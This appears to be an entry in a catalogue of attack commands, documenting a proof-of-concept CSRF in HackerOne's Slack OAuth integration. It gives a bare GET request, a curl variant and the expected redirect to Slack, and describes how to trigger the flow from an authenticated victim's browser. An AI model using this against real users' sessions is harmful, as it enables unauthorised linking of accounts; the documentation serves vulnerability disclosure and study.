---
id: cmd-get-hackerone-slack-auth
data: 'GET https://hackerone.com/auth/slack HTTP/1.1'
tags:
  - csrf
  - oauth
  - poc
type: command
output: >-
  HTTP/1.1 302 Found

  Location:
  https://slack.com/oauth/authorize?client_id=2174110321.11522100978&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&response_type=code&scope=incoming-webhook&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.808Z'
verified: false
validated: true
submitted: true
---
# get-hackerone-slack-auth

## Command

```bash
GET https://hackerone.com/auth/slack HTTP/1.1
```

## Description

This HTTP GET request initiates the vulnerable Slack OAuth flow on HackerOne without CSRF protection, demonstrating the PoC for the integration setup flaw. Use it to force a redirect to Slack's authorize endpoint when executed from an authenticated victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | Direct GET to endpoint; no query params needed for basic exploit | No |

## Examples

### Basic Usage

```bash
GET https://hackerone.com/auth/slack HTTP/1.1
```

### Advanced Usage

Embed in curl for testing: `curl -v https://hackerone.com/auth/slack` (note: requires cookies for auth simulation).

## Expected Output

HTTP response with Location header redirecting to https://slack.com/oauth/authorize?client_id=2174110321.11522100978&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&response_type=code&scope=incoming-webhook&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c.

## Related

- [[Related Procedure: Initiate-CSRF-Unprotected-Slack-OAuth-Flow]]
